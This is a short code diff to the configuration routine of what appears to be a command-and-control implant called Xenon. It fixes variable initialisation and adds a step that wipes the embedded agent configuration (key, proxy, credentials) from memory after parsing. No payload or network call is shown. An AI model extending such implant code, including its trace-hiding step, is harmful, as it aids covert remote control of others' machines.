@@ -24,11 +24,14 @@ PCONFIG_XENON xenonConfig = NULL;
 VOID XenonConfigure()
 {
     PARSER ParserConfig = { 0 };
+    SIZE_T sizeUuid     = TASK_UUID_SIZE;
+    SIZE_T keyLen       = 0;
+    SIZE_T proxyLen     = 0;
+    SIZE_T userLen      = 0;
+    SIZE_T passLen      = 0;
 
     ParserNew(&ParserConfig, (PBYTE)AgentConfig, sizeof(AgentConfig));
-
-    SIZE_T sizeUuid = TASK_UUID_SIZE;
-    SIZE_T keyLen, proxyLen, userLen, passLen = 0;
+    RtlSecureZeroMemory(AgentConfig, sizeof(AgentConfig));
 
     // Settings for global Xenon config
     xenonConfig->agentID             = ParserStringCopy(&ParserConfig, &sizeUuid);                  // allocates
